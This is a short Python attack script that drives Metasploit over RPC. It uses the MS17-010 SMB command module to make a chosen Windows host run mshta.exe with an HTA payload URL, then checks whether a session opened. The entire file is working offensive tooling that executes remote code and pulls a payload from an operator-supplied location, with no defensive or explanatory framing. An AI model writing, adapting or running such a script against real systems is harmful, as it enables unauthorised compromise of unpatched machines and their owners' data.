from library.pymetasploit3.msfrpc import MsfRpcClient
from time import sleep
#This module will only works with a hta link, it is compatible with mshta.py by transferring the URL over to this program as cmd


def init(client,host,cmd=''):
    cid = client.consoles.console().cid
    exploit = client.modules.use('auxiliary','admin/smb/ms17_010_command')
    exploit['ConnectTimeout'] = 120
    exploit['RHOSTS'] = host
    exploit['COMMAND'] = 'mshta.exe {}'.format(cmd)
    output = (client.consoles.console(cid).run_module_with_output(exploit).split('['))    
    x=1
    while x < len(output):
        print("[{}".format(output[x]),end= '')
        x+=1
    sleep(3)
    print("[*] Searching for exploited sessions...")
    for id,c in client.sessions.list.items():
        if c.get('session_host') == host:
            print("[+] Exploit is successful, session is {}.".format(id))
            exit()
    print("[-] No session is created.")


if __name__ == '__main__':
    client = MsfRpcClient('123',port=55552)
    host= input("Enter the host address: ")
    cmd = input("Input the hta file location: ")
    init(client,host,cmd)